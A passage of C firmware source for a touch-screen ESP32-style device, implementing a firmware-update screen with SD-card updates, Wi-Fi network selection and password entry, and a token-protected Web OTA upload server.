  maintainTouchNavBar();
}

static void FirmwareUpdate_fwClearBody(uint16_t color) {
  const int bottom = FirmwareUpdate_fwContentBottom();
  if (bottom > 37) {
    display_fill_rect(&(tft), 0, 37, 240, bottom - 37, color);
  }
  FirmwareUpdate_fwRestoreNavChrome();
}

static bool FirmwareUpdate_fwTouchInFooter(int x, int y, uint8_t index);
static bool FirmwareUpdate_fwTouchFooterLabel(int x, int y, const char* label);

static bool FirmwareUpdate_fwActionPressed(const char* label, int x, int y,
                                           bool touchValid) {
  if (!label || !label[0]) {
    return false;
  }
  if (featureHasTouchNavBar()) {
    if (strcmp(label, "Back") == 0 || strcmp(label, "Exit") == 0 ||
        strcmp(label, "Cancel") == 0) {
      return isTouchNavButtonPressedEdge(BTN_LEFT);
    }
    if (strcmp(label, "Start") == 0 || strcmp(label, "OK") == 0 ||
        strcmp(label, "Rescan") == 0) {
      return isTouchNavButtonPressedEdge(BTN_SELECT);
    }
    if (strcmp(label, "Prev") == 0) {
      return isTouchNavButtonPressedEdge(BTN_UP);
    }
    if (strcmp(label, "Next") == 0) {
      return isTouchNavButtonPressedEdge(BTN_RIGHT);
    }
    return false;
  }
  return touchValid && FirmwareUpdate_fwTouchFooterLabel(x, y, label);
}

static void FirmwareUpdate_fwApplyTabNavLabels(const char* leftButton,
                                               const char* prevButton,
                                               const char* nextButton) {
  const char* left = NULL;
  const char* center = NULL;
  const char* up = NULL;
  const char* right = NULL;

  const char* buttons[] = {leftButton, prevButton, nextButton};
  for (size_t i = 0; i < DIV_ARRAY_SIZE(buttons); ++i) {
    const char* btn = buttons[i];
    if (!btn || !*btn) continue;
    if (!strcmp(btn, "Back") || !strcmp(btn, "Exit") || !strcmp(btn, "Cancel"))
      left = btn;
    else if (!strcmp(btn, "Start") || !strcmp(btn, "OK") ||
             !strcmp(btn, "Rescan"))
      center = btn;
    else if (!strcmp(btn, "Prev"))
      up = btn;
    else if (!strcmp(btn, "Next"))
      right = btn;
  }
  FirmwareUpdate_fwUpdateNavLabels(left, NULL, center, up, right);
}

static void FirmwareUpdate_fwDrawFooterButtons(void) {
  for (uint8_t i = 0; i < FirmwareUpdate_s_fwFooterCount; ++i) {
    FeatureUI_drawButton(&(FirmwareUpdate_s_fwFooter[i]), false);
  }
}

static bool FirmwareUpdate_fwTouchInFooter(int x, int y, uint8_t index) {
  if (index >= FirmwareUpdate_s_fwFooterCount) return false;
  __auto_type b = &(FirmwareUpdate_s_fwFooter[index]);
  return x >= (*b).x && x <= ((*b).x + (*b).w) && y >= (*b).y &&
         y <= ((*b).y + (*b).h);
}

static bool FirmwareUpdate_fwTouchFooterLabel(int x, int y, const char* label) {
  if (!label || !label[0]) return false;
  for (uint8_t i = 0; i < FirmwareUpdate_s_fwFooterCount; ++i) {
    if (FirmwareUpdate_s_fwFooter[i].label &&
        strcmp(FirmwareUpdate_s_fwFooter[i].label, label) == 0) {
      return FirmwareUpdate_fwTouchInFooter(x, y, i);
    }
  }
  return false;
}

static void FirmwareUpdate_fwStoreFooter(const FeatureUI_Button* src,
                                         uint8_t count) {
  FirmwareUpdate_s_fwFooterCount = count;
  for (uint8_t i = 0; i < count && i < 4; ++i) {
    FirmwareUpdate_s_fwFooter[i] = src[i];
  }
}

void FirmwareUpdate_runUI(void) {
#define SCREEN_WIDTH TFT_WIDTH
#define SCREENHEIGHT TFT_HEIGHT
#undef STATUS_BAR_Y_OFFSET
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#undef ICON_NUM
#define ICON_NUM 1

  static int iconX[ICON_NUM] = {10};
  static int iconY = STATUS_BAR_Y_OFFSET;

  static const unsigned char* icons[ICON_NUM] = {bitmap_icon_go_back};

  if (!FirmwareUpdate_uiDrawn) {
    display_fill_rect(&(tft), 0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH,
                      STATUS_BAR_HEIGHT, DARK_GRAY);
    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        display_draw_bitmap(&(tft), iconX[i], iconY, icons[i], ICON_SIZE,
                            ICON_SIZE, TFT_WHITE);
      }
    }
    display_draw_fast_h_line(&(tft), 0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT,
                             SCREEN_WIDTH, UI_LINE);
    FirmwareUpdate_uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;
  static unsigned long lastSpamTime = 0;

  switch (animationState) {
    case 0:
      break;

    case 1:
      if (sys_monotonic_ms() - lastAnimationTime >= 150) {
        display_draw_bitmap(&(tft), iconX[activeIcon], iconY, icons[activeIcon],
                            ICON_SIZE, ICON_SIZE, TFT_WHITE);
        animationState = 2;
        lastAnimationTime = sys_monotonic_ms();
      }
      break;

    case 2:
      if (sys_monotonic_ms() - lastAnimationTime >= 200) {
        animationState = 3;
        lastAnimationTime = sys_monotonic_ms();
      }
      break;

    case 3:
      switch (activeIcon) {
        case 0:
          feature_exit_requested = true;
          animationState = 0;
          activeIcon = -1;
          break;
      }
      break;
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;

  if (sys_monotonic_ms() - lastTouchCheck >= touchCheckInterval) {
    int x, y;
    if (!featureHasTouchNavBar() && feature_active && readTouchXY(&(x), &(y))) {
      if (y >= STATUS_BAR_Y_OFFSET &&
          y <= STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT - 1) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x >= iconX[i] && x <= iconX[i] + ICON_SIZE - 1) {
            if (icons[i] != NULL && animationState == 0) {
              display_draw_bitmap(&(tft), iconX[i], iconY, icons[i], ICON_SIZE,
                                  ICON_SIZE, TFT_BLACK);
              animationState = 1;
              activeIcon = i;
              lastAnimationTime = sys_monotonic_ms();
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = sys_monotonic_ms();
  }
}

void FirmwareUpdate_drawButton(int x, int y, int w, int h, const char* label,
                               bool highlight, bool disabled) {
  FeatureUI_ButtonStyle style = highlight ? FeatureUI_ButtonStyle_Primary
                                          : FeatureUI_ButtonStyle_Secondary;
  FeatureUI_drawButtonRect(x, y, w, h, label, style, false, disabled, 1);
}

void FirmwareUpdate_drawTabBar(const char* leftButton, bool leftDisabled,
                               const char* prevButton, bool prevDisabled,
                               const char* nextButton, bool nextDisabled) {
  if (featureHasTouchNavBar()) {
    (void)leftDisabled;
    (void)prevDisabled;
    (void)nextDisabled;
    FirmwareUpdate_fwApplyTabNavLabels(leftButton, prevButton, nextButton);
    return;
  }
  FeatureUI_drawFooterBg();
  FirmwareUpdate_s_fwFooterCount = 0;

  const bool hasLeft = leftButton && leftButton[0];
  const bool hasMid = prevButton && prevButton[0];
  const bool hasRight = nextButton && nextButton[0];

  if (hasLeft && hasMid && hasRight) {
    FeatureUI_Button btns[3];
    FeatureUI_layoutFooter3(&(btns), leftButton,
                            FeatureUI_ButtonStyle_Secondary, prevButton,
                            FeatureUI_ButtonStyle_Secondary, nextButton,
                            FeatureUI_ButtonStyle_Secondary, leftDisabled,
                            prevDisabled, nextDisabled);
    FirmwareUpdate_fwStoreFooter(btns, 3);
  } else if (hasLeft && hasMid) {
    FeatureUI_Button btns[2];
    FeatureUI_layoutFooter2(
        &(btns), leftButton, FeatureUI_ButtonStyle_Secondary, prevButton,
        FeatureUI_ButtonStyle_Secondary, leftDisabled, prevDisabled);
    FirmwareUpdate_fwStoreFooter(btns, 2);
  } else if (hasLeft && hasRight) {
    FeatureUI_Button btns[2];
    FeatureUI_layoutFooter2(
        &(btns), leftButton, FeatureUI_ButtonStyle_Secondary, nextButton,
        FeatureUI_ButtonStyle_Secondary, leftDisabled, nextDisabled);
    FirmwareUpdate_fwStoreFooter(btns, 2);
  } else if (hasMid && hasRight) {
    FeatureUI_Button btns[2];
    FeatureUI_layoutFooter2(
        &(btns), prevButton, FeatureUI_ButtonStyle_Secondary, nextButton,
        FeatureUI_ButtonStyle_Secondary, prevDisabled, nextDisabled);
    FirmwareUpdate_fwStoreFooter(btns, 2);
  } else if (hasRight) {
    FeatureUI_layoutFooter1(&(FirmwareUpdate_s_fwFooter[0]), nextButton,
                            FeatureUI_ButtonStyle_Secondary, nextDisabled);
    FirmwareUpdate_s_fwFooterCount = 1;
  } else if (hasLeft) {
    FeatureUI_layoutFooter1(&(FirmwareUpdate_s_fwFooter[0]), leftButton,
                            FeatureUI_ButtonStyle_Secondary, leftDisabled);
    FirmwareUpdate_s_fwFooterCount = 1;
  } else if (hasMid) {
    FeatureUI_layoutFooter1(&(FirmwareUpdate_s_fwFooter[0]), prevButton,
                            FeatureUI_ButtonStyle_Secondary, prevDisabled);
    FirmwareUpdate_s_fwFooterCount = 1;
  }
  FirmwareUpdate_fwDrawFooterButtons();
}

static void FirmwareUpdate_drawNetworkTabBar(bool prevDisabled,
                                             bool nextDisabled) {
  if (featureHasTouchNavBar()) {
    FirmwareUpdate_fwUpdateNavLabels("Back", NULL, "Rescan",
                                     prevDisabled ? NULL : "Prev",
                                     nextDisabled ? NULL : "Next");
    return;
  }
  FeatureUI_drawFooterBg();
  FeatureUI_Button btns[4];
  FeatureUI_layoutFooter4(&(btns), "Back", FeatureUI_ButtonStyle_Secondary,
                          "Rescan", FeatureUI_ButtonStyle_Secondary, "Prev",
                          FeatureUI_ButtonStyle_Secondary, "Next",
                          FeatureUI_ButtonStyle_Secondary, false, false,
                          prevDisabled, nextDisabled);
  FirmwareUpdate_fwStoreFooter(btns, 4);
  FirmwareUpdate_fwDrawFooterButtons();
}

void FirmwareUpdate_drawMenu(void) {
  display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);
  const int bodyBottom = FirmwareUpdate_fwContentBottom();
  display_fill_rect(&(tft), 0, 37, 240, bodyBottom - 37, TFT_BLACK);

  display_set_text_size(&(tft), 1);

  FirmwareUpdate_drawButton(BUTTON1_X, BUTTON1_Y, BUTTON_WIDTH, BUTTON_HEIGHT,
                            "SD Update", false, false);
  FirmwareUpdate_drawButton(BUTTON2_X, BUTTON2_Y, BUTTON_WIDTH, BUTTON_HEIGHT,
                            "Web OTA", false, false);

  if (featureHasTouchNavBar()) {
    FirmwareUpdate_fwUpdateNavLabels("Exit", NULL, NULL, NULL, NULL);
  } else {
    FeatureUI_drawFooterBg();
    FeatureUI_layoutFooter1(&(FirmwareUpdate_s_fwFooter[0]), "Back",
                            FeatureUI_ButtonStyle_Secondary, false);
    FirmwareUpdate_s_fwFooterCount = 1;
    FeatureUI_drawButton(&(FirmwareUpdate_s_fwFooter[0]), false);
  }
}

bool FirmwareUpdate_checkButton(int16_t x, int16_t y, int buttonX, int buttonY,
                                int buttonW, int buttonH) {
  return x >= buttonX && x <= buttonX + buttonW - 1 && y >= buttonY &&
         y <= buttonY + buttonH - 1;
}

// Returns true when Back was pressed via touch nav (edge already consumed).
static bool FirmwareUpdate_waitForTouchXY(int* x, int* y) {
  FirmwareUpdate_fwEnsureToolbar();
  while (true) {
    if (feature_exit_requested) {
      (*x) = (*y) = 0;
      return false;
    }
    if (featureHasTouchNavBar()) {
      maintainTouchNavBar();
      if (FirmwareUpdate_fwActionPressed("Back", 0, 0, false)) {
        (*x) = (*y) = 0;
        return true;
      }
    }
    if (readTouchXY(&((*x)), &((*y)))) {
      sys_sleep_ms(80);
      return false;
    }
    sys_sleep_ms(10);
  }
}

int FirmwareUpdate_yshift = 40;

void FirmwareUpdate_performSDUpdate(void) {
  if (!isSDCardAvailable()) {
    showNotification("Firmware", "SD card unavailable");
    return;
  }
  storage_file_t file __attribute__((cleanup(storage_file_close))) =
      storage_file_open(FIRMWARE_FILE, "rb");
  if (!storage_file_valid(&(file)) || ((file).directory != NULL)) {
    showNotification("Firmware",
                     "Place the application image at /firmware.bin");
    return;
  }
  firmware_update_t update __attribute__((cleanup(firmware_abort))) = {0};
  esp_err_t err = firmware_begin(&(update), storage_file_size(&(file)));
  uint8_t buffer[1024];
  while (err == ESP_OK && storage_file_available(&(file))) {
    if (feature_exit_requested ||
        FirmwareUpdate_fwActionPressed("Back", 0, 0, false))
      return;
    const int n = storage_file_read(&(file), buffer, sizeof(buffer));
    if (n <= 0) {
      err = ESP_FAIL;
      break;
    }
    err = firmware_write(&(update), buffer, n);
    display_fill_rect(&(tft), 8, 65, 224, 24, TFT_BLACK);
    display_set_cursor(&(tft), 10, 70);
    display_printf(
        &(tft), "Installing: %u%%",
        (unsigned)((update).received * 100 / storage_file_size(&(file))));
    sys_sleep_ms(1);
  }
  if (err == ESP_OK) err = firmware_finish(&(update));
  if (err != ESP_OK) {
    showNotification("Update failed", esp_err_to_name(err));
    return;
  }
  storage_file_close(&(file));
  display_fill_screen(&(tft), TFT_BLACK);
  display_draw_string(&(tft), "Update complete. Restarting", 8, 100, 0);
  sys_sleep_ms(1500);
  esp_restart();
}

bool FirmwareUpdate_selectWiFiNetwork(void) {
  FirmwareUpdate_uiDrawn = false;
  display_fill_rect(&(tft), 0, 37, 240, 320, TFT_BLACK);
  display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);
  display_set_cursor(&(tft), 10, 50);
  display_set_text_color_1(&(tft), GREEN);
  display_set_text_size(&(tft), 1);
  display_print_line_cstr(&(tft), "Scanning.");
  network_set_mode(WIFI_MODE_STA);
  network_disconnect_options(false, false);
  sys_sleep_ms(100);

  int numNetworks = network_scan(false, true, false, 120);
  if (numNetworks <= 0) {
    display_fill_rect(&(tft), 0, 37, 240, 320, TFT_BLACK);
    display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);
    display_set_text_color_1(&(tft), GREEN);
    display_set_cursor(&(tft), 10, 50);
    display_print_line_cstr(&(tft), "No networks found.");
    display_set_cursor(&(tft), 10, 60);
    display_print_line_cstr(&(tft), "Touch to retry");
    FirmwareUpdate_drawTabBar("Back", false, "Rescan", false, "", true);
    FirmwareUpdate_fwEnsureToolbar();
    while (true) {
      if (featureHasTouchNavBar()) {
        maintainTouchNavBar();
      }
      if (FirmwareUpdate_fwActionPressed("Back", 0, 0, false)) {
        return false;
      }
      if (FirmwareUpdate_fwActionPressed("Rescan", 0, 0, false)) {
        return FirmwareUpdate_selectWiFiNetwork();
      }
      int x, y;
      if (readTouchXY(&(x), &(y))) {
        sys_sleep_ms(200);
        if (FirmwareUpdate_fwActionPressed("Back", x, y, true)) {
          return false;
        }
        if (FirmwareUpdate_fwActionPressed("Rescan", x, y, true)) {
          return FirmwareUpdate_selectWiFiNetwork();
        }
        break;
      }
      sys_sleep_ms(10);
    }
    return false;
  }

  NetworkInfo* networks = calloc(numNetworks, sizeof(NetworkInfo));
  for (int i = 0; i < numNetworks; i++) {
    strncpy(networks[i].ssid, (network_ssid(i)).data, 31);
    networks[i].ssid[31] = '\0';
    networks[i].rssi = network_rssi(i);
    networks[i].channel = network_channel(i);
    networks[i].authmode = network_auth_mode(i);
  }

  int startIndex = 0;
  int selectedIndex = -1;
  bool selected = false;
  int lastPaintedStart = -1;
  int lastPaintedSel = -2;
  while (!selected) {
    if (featureHasTouchNavBar()) {
      maintainTouchNavBar();
    }
    if (feature_exit_requested) {
      free(networks);
      FirmwareUpdate_wifiPassword[0] = '\0';
      return false;
    }
    if (FirmwareUpdate_fwActionPressed("Back", 0, 0, false)) {
      free(networks);
      FirmwareUpdate_wifiPassword[0] = '\0';
      return false;
    }
    if (FirmwareUpdate_fwActionPressed("Rescan", 0, 0, false)) {
      free(networks);
      return FirmwareUpdate_selectWiFiNetwork();
    }
    if (FirmwareUpdate_fwActionPressed("Prev", 0, 0, false) && startIndex > 0) {
      startIndex -= FW_NETWORKS_PER_PAGE;
      selectedIndex = -1;
    }
    if (FirmwareUpdate_fwActionPressed("Next", 0, 0, false) &&
        startIndex + FW_NETWORKS_PER_PAGE < numNetworks) {
      startIndex += FW_NETWORKS_PER_PAGE;
      selectedIndex = -1;
    }
    if (startIndex != lastPaintedStart || selectedIndex != lastPaintedSel) {
      FirmwareUpdate_drawNetworkList(startIndex, numNetworks, networks,
                                     selectedIndex);
      lastPaintedStart = startIndex;
      lastPaintedSel = selectedIndex;
    }
    int x, y;
    if (!readTouchXY(&(x), &(y))) {
      sys_sleep_ms(10);
      continue;
    }
    sys_sleep_ms(200);

    int y_pos = NETWORK_Y_START;
    int end_index = DIV_MIN(startIndex + FW_NETWORKS_PER_PAGE, numNetworks);
    for (int i = startIndex; i < end_index && y_pos < 300; i++) {
      if (x >= 10 && x < SCREEN_WIDTH - 10 && y >= y_pos &&
          y < y_pos + NETWORK_ROW_HEIGHT) {
        char buf[64];
        char ssid[16];
        strncpy(ssid, networks[i].ssid, 11);
        ssid[11] = '\0';
        if (strlen(networks[i].ssid) > 11) strcat(ssid, "...");
        const char* enc =
            networks[i].authmode == WIFI_AUTH_OPEN ? "OPEN" : "WPA2";
        snprintf(buf, sizeof(buf), "%02d: %-15s %3d dBm Ch%2d %s", i + 1, ssid,
                 networks[i].rssi, networks[i].channel, enc);
        display_set_text_color_2(&(tft), ORANGE, TFT_BLACK);
        display_set_text_size(&(tft), 1);
        display_set_cursor(&(tft), 10, y_pos);
        display_print_line_cstr(&(tft), (TEXT(buf)).data);
        sys_sleep_ms(100);
        display_set_text_color_2(
            &(tft),
            i == selectedIndex
                ? ORANGE
                : (networks[i].authmode == WIFI_AUTH_OPEN ? ORANGE : TFT_WHITE),
            TFT_BLACK);
        display_set_cursor(&(tft), 10, y_pos);
        display_print_line_cstr(&(tft), (TEXT(buf)).data);
        selectedIndex = i;
        strncpy(FirmwareUpdate_selectedSSID, networks[i].ssid, 31);
        FirmwareUpdate_selectedSSID[31] = '\0';
        selected = true;
        break;
      }
      y_pos += NETWORK_ROW_HEIGHT;
    }

    if (FirmwareUpdate_fwActionPressed("Back", x, y, true)) {
      free(networks);
      FirmwareUpdate_wifiPassword[0] = '\0';
      return false;
    }
    if (FirmwareUpdate_fwActionPressed("Rescan", x, y, true)) {
      free(networks);
      return FirmwareUpdate_selectWiFiNetwork();
    }
    if (FirmwareUpdate_fwActionPressed("Prev", x, y, true) && startIndex > 0) {
      startIndex -= FW_NETWORKS_PER_PAGE;
      selectedIndex = -1;
    }
    if (FirmwareUpdate_fwActionPressed("Next", x, y, true) &&
        startIndex + FW_NETWORKS_PER_PAGE < numNetworks) {
      startIndex += FW_NETWORKS_PER_PAGE;
      selectedIndex = -1;
    }
  }

  free(networks);
  return true;
}

void FirmwareUpdate_drawNetworkList(int startIndex, int numNetworks,
                                    NetworkInfo* networks, int selectedIndex) {
  display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);
  const int bodyBottom = FirmwareUpdate_fwContentBottom();
  display_fill_rect(&(tft), 0, 37, 240, bodyBottom - 37, TFT_BLACK);
  display_set_text_size(&(tft), 1);

  if (numNetworks == 0) {
    display_set_text_color_1(&(tft), GREEN);
    display_set_cursor(&(tft), 10, 50);
    display_print_line_cstr(&(tft), "No networks found.");
  } else {
    int y = 50;
    display_set_text_color_1(&(tft), GREEN);
    display_set_cursor(&(tft), 10, y);
    display_print_line_cstr(&(tft), "Networks:");
    y += 20;

    int start_index = startIndex;
    int end_index = DIV_MIN(start_index + FW_NETWORKS_PER_PAGE, numNetworks);

    for (int i = start_index; i < end_index && y < 300; i++) {
      char buf[64];
      char ssid[16];
      strncpy(ssid, networks[i].ssid, 11);
      ssid[11] = '\0';
      if (strlen(networks[i].ssid) > 11) strcat(ssid, "...");
      const char* enc =
          networks[i].authmode == WIFI_AUTH_OPEN ? "OPEN" : "WPA2";
      snprintf(buf, sizeof(buf), "%02d: %-15s %3d dBm Ch%2d %s", i + 1, ssid,
               networks[i].rssi, networks[i].channel, enc);
      display_set_cursor(&(tft), 10, y);
      display_set_text_color_1(
          &(tft),
          i == selectedIndex
              ? ORANGE
              : (networks[i].authmode == WIFI_AUTH_OPEN ? ORANGE : TFT_WHITE));
      display_print_line_cstr(&(tft), (TEXT(buf)).data);
      y += NETWORK_ROW_HEIGHT;
    }

    char page_buf[32];
    snprintf(page_buf, sizeof(page_buf), "Page %lu/%lu",
             (unsigned long)(start_index / FW_NETWORKS_PER_PAGE + 1),
             (unsigned long)((numNetworks + FW_NETWORKS_PER_PAGE - 1) /
                             FW_NETWORKS_PER_PAGE));
    display_set_cursor(&(tft), 180, 50);
    display_set_text_color_1(&(tft), GREEN);
    display_print_line_cstr(&(tft), (TEXT(page_buf)).data);
  }

  bool prevDisabled = startIndex == 0;
  bool nextDisabled = (startIndex + FW_NETWORKS_PER_PAGE) >= numNetworks;
  FirmwareUpdate_drawNetworkTabBar(prevDisabled, nextDisabled);
  FirmwareUpdate_fwEnsureToolbar();
}

bool FirmwareUpdate_enterWiFiPassword(void) {
  FirmwareUpdate_wifiPassword[0] = '\0';

  OnScreenKeyboardConfig cfg = OnScreenKeyboardConfig_INITIALIZER;
  cfg.titleLine1 = "[!] Enter the Wi-Fi password for the";
  cfg.titleLine2 = "selected network. ^ caps, # sym";
  osKeyboardUseStandardLayout(&(cfg));
  cfg.maxLen = PASSWORD_MAX_LENGTH;
  cfg.shuffleNames = NULL;
  cfg.shuffleCount = 0;
  cfg.buttonsY = 195;
  cfg.backLabel = "Back";
  cfg.middleLabel = "Del";
  cfg.okLabel = "OK";
  cfg.enableShuffle = false;
  cfg.requireNonEmpty = true;
  cfg.emptyErrorMsg = "Password cannot be empty!";

  OnScreenKeyboardResult r = showOnScreenKeyboard(&(cfg), TEXT(""));

  if (!r.accepted) {
    FirmwareUpdate_wifiPassword[0] = '\0';
    return false;
  }

  size_t n =
      DIV_MIN((size_t)PASSWORD_MAX_LENGTH, (size_t)strlen((r.text).data));
  for (size_t i = 0; i < n; ++i) {
    FirmwareUpdate_wifiPassword[i] = (r.text).data[i];
  }
  FirmwareUpdate_wifiPassword[n] = '\0';

  return true;
}

static esp_err_t FirmwareUpdate_fwHttpSend(httpd_req_t* req, const char* type,
                                           const char* body) {
  httpd_resp_set_type(req, type);
  httpd_resp_set_hdr(req, "Connection", "close");
  return httpd_resp_send(req, body, HTTPD_RESP_USE_STRLEN);
}

static esp_err_t FirmwareUpdate_fwIndexHandler(httpd_req_t* req) {
  return FirmwareUpdate_fwHttpSend(req, "text/html", FirmwareUpdate_loginIndex);
}

static esp_err_t FirmwareUpdate_fwServerIndexHandler(httpd_req_t* req) {
  return FirmwareUpdate_fwHttpSend(req, "text/html",
                                   FirmwareUpdate_serverIndex);
}

static void FirmwareUpdate_fwUpdateUiSuccess(void) {
  display_fill_rect(&(tft), 0, 37, 240, 320, TFT_BLACK);
  display_set_cursor(&(tft), 10, 10 + FirmwareUpdate_yshift);
  display_set_text_color_2(&(tft), TFT_GREEN, TFT_BLACK);
  display_set_text_size(&(tft), 1);
  display_print_line_cstr(&(tft), "Update OK!");
  display_set_text_color_2(&(tft), TFT_WHITE, TFT_BLACK);
  display_set_cursor(&(tft), 10, 20 + FirmwareUpdate_yshift);
  display_print_line_cstr(&(tft), "Rebooting...");
}

static void FirmwareUpdate_fwUpdateUiFail(void) {
  display_fill_rect(&(tft), 0, 37, 240, 320, TFT_BLACK);
  display_set_cursor(&(tft), 10, 10 + FirmwareUpdate_yshift);
  display_set_text_color_2(&(tft), UI_WARN, TFT_BLACK);
  display_print_line_cstr(&(tft), "X Update Failed!");
  display_set_text_color_2(&(tft), TFT_WHITE, TFT_BLACK);
  display_set_cursor(&(tft), 10, 20 + FirmwareUpdate_yshift);
  display_print_line_cstr(&(tft), "Touch to retry or Back");
  FirmwareUpdate_drawTabBar("", false, "", false, "Back", false);
  FirmwareUpdate_fwRestoreNavChrome();
}

static char FirmwareUpdate_update_token[9] = {0};
static _Atomic(bool) FirmwareUpdate_update_complete = {false};

static esp_err_t FirmwareUpdate_fwUpdatePostHandler(httpd_req_t* req) {
  char token[16] = {0};
  if (httpd_req_get_hdr_value_str(req, "X-Update-Token", token,
                                  sizeof(token)) != ESP_OK ||
      !FirmwareUpdate_update_token[0] ||
      strcmp(token, FirmwareUpdate_update_token) != 0) {
    httpd_resp_set_status(req, "403 Forbidden");
    return httpd_resp_send(req, "Enter the code shown on the device",
                           HTTPD_RESP_USE_STRLEN);
  }
  firmware_update_t update __attribute__((cleanup(firmware_abort))) = {0};
  esp_err_t err = firmware_begin(&(update), req->content_len);
  size_t remaining = req->content_len;
  uint8_t buffer[1024];
  int timeouts = 0;
  while (err == ESP_OK && remaining) {
    int n = httpd_req_recv(req, ((char*)(buffer)),
                           DIV_MIN(remaining, sizeof(buffer)));
    if (n == HTTPD_SOCK_ERR_TIMEOUT && ++timeouts <= 3) continue;
    if (n <= 0) {
      err = ESP_FAIL;
      break;
    }
    err = firmware_write(&(update), buffer, n);
    remaining -= n;
  }
  if (err == ESP_OK) err = firmware_finish(&(update));
  if (err != ESP_OK) {
    return httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST,
                               esp_err_to_name(err));
  }
  esp_err_t response = httpd_resp_send(
      req, "Firmware installed. Device restarting.", HTTPD_RESP_USE_STRLEN);
  atomic_store(&(FirmwareUpdate_update_complete), true);
  return response;
}

static bool FirmwareUpdate_fwStartHttpServer(void) {
  if (FirmwareUpdate_fw_httpd) return true;
  snprintf(FirmwareUpdate_update_token, sizeof(FirmwareUpdate_update_token),
           "%08lX", ((unsigned long)(esp_random())));
  atomic_store(&(FirmwareUpdate_update_complete), false);
  display_set_cursor(&(tft), 10, 165);
  display_printf(&(tft), "Update code: %s", FirmwareUpdate_update_token);

  httpd_config_t config = HTTPD_DEFAULT_CONFIG();
  config.stack_size = 8192;
  config.uri_match_fn = httpd_uri_match_wildcard;

  if (httpd_start(&FirmwareUpdate_fw_httpd, &config) != ESP_OK) {
    FirmwareUpdate_fw_httpd = NULL;
    return false;
  }

  httpd_uri_t root = {.uri = "/",
                      .method = HTTP_GET,
                      .handler = FirmwareUpdate_fwIndexHandler,
                      .user_ctx = NULL};
  httpd_uri_t serverIndexUri = {.uri = "/serverIndex",
                                .method = HTTP_GET,
                                .handler = FirmwareUpdate_fwServerIndexHandler,
                                .user_ctx = NULL};
  httpd_uri_t update = {.uri = "/update",
                        .method = HTTP_POST,
                        .handler = FirmwareUpdate_fwUpdatePostHandler,
                        .user_ctx = NULL};
  httpd_register_uri_handler(FirmwareUpdate_fw_httpd, &root);
  httpd_register_uri_handler(FirmwareUpdate_fw_httpd, &serverIndexUri);
  httpd_register_uri_handler(FirmwareUpdate_fw_httpd, &update);
  return true;
}

static bool FirmwareUpdate_fw_mdns_active = false;
static void FirmwareUpdate_fwStopHttpServer(void) {
  if (FirmwareUpdate_fw_mdns_active) {
    mdns_free();
    FirmwareUpdate_fw_mdns_active = false;
  }
  if (FirmwareUpdate_fw_httpd) {
    httpd_stop(FirmwareUpdate_fw_httpd);
    FirmwareUpdate_fw_httpd = NULL;
  }
}

void FirmwareUpdate_performWebOTAUpdate(void) {
  FirmwareUpdate_uiDrawn = false;

  if (!FirmwareUpdate_selectWiFiNetwork()) {
    FirmwareUpdate_drawMenu();
    return;
  }

  if (!FirmwareUpdate_enterWiFiPassword()) {
    FirmwareUpdate_drawMenu();
    return;
  }

  updateStatusBar();
  FirmwareUpdate_runUI();
  const int bodyBottom = FirmwareUpdate_fwContentBottom();
  display_fill_rect(&(tft), 0, 37, 240, bodyBottom - 37, TFT_BLACK);
  display_set_cursor(&(tft), 10, 10 + FirmwareUpdate_yshift);
  display_set_text_color_2(&(tft), TFT_WHITE, TFT_BLACK);
  display_set_text_size(&(tft), 1);
  display_print_line_cstr(&(tft), "Starting Web OTA...");
  FirmwareUpdate_drawTabBar("", false, "", false, "Back", false);

  display_set_text_color_2(&(tft), TFT_WHITE, TFT_BLACK);
  display_set_cursor(&(tft), 10, 30 + FirmwareUpdate_yshift);
  display_print_line_cstr(&(tft), "Connecting Wi-Fi");
  FirmwareUpdate_fwEnsureToolbar();
  network_connect_config(FirmwareUpdate_selectedSSID,
                         FirmwareUpdate_wifiPassword, 0, NULL);
  int attempts = 0;
  uint32_t lastConnectPollMs = 0;
  while (network_connected() != true && attempts < 20) {
    const uint32_t now = sys_monotonic_ms();
    if ((uint32_t)(now - lastConnectPollMs) >= 50u) {
      lastConnectPollMs = now;
      if (featureHasTouchNavBar()) {
        maintainTouchNavBar();
      }
      if (feature_exit_requested ||
          FirmwareUpdate_fwActionPressed("Back", 0, 0, false)) {
        network_disconnect_options(false, false);
        return;
      }
      int x, y;
      if (readTouchXY(&(x), &(y)) &&
          FirmwareUpdate_fwActionPressed("Back", x, y, true)) {
        network_disconnect_options(false, false);
        FirmwareUpdate_drawMenu();
        return;
      }
    }
    sys_sleep_ms(500);
    attempts++;
  }
  if (network_connected() != true) {
    FirmwareUpdate_fwUpdateUiFail();
    int x, y;
    if (FirmwareUpdate_waitForTouchXY(&(x), &(y))) {
      network_disconnect_options(false, false);
      FirmwareUpdate_drawMenu();
      return;
    }
    FirmwareUpdate_fwStopHttpServer();
    network_disconnect_options(false, false);
    FirmwareUpdate_drawMenu();
    return;
  }

  display_set_text_color_2(&(tft), TFT_GREEN, TFT_BLACK);
  display_set_cursor(&(tft), 10, 40 + FirmwareUpdate_yshift);
  display_print_line_cstr(&(tft), "Wi-Fi OK");
  display_set_text_color_2(&(tft), TFT_WHITE, TFT_BLACK);
  display_set_cursor(&(tft), 10, 50 + FirmwareUpdate_yshift);
  display_print(&(tft), "IP: ");
  display_print_line_cstr(&(tft), (TEXT(network_ipv4(false))).data);
  display_set_cursor(&(tft), 10, 70 + FirmwareUpdate_yshift);
  display_print_line_cstr(&(tft), "URL: http://esp32.local");
  display_set_cursor(&(tft), 10, 80 + FirmwareUpdate_yshift);
  display_print_line_cstr(&(tft), "Use code shown below");
  display_set_cursor(&(tft), 10, 90 + FirmwareUpdate_yshift);

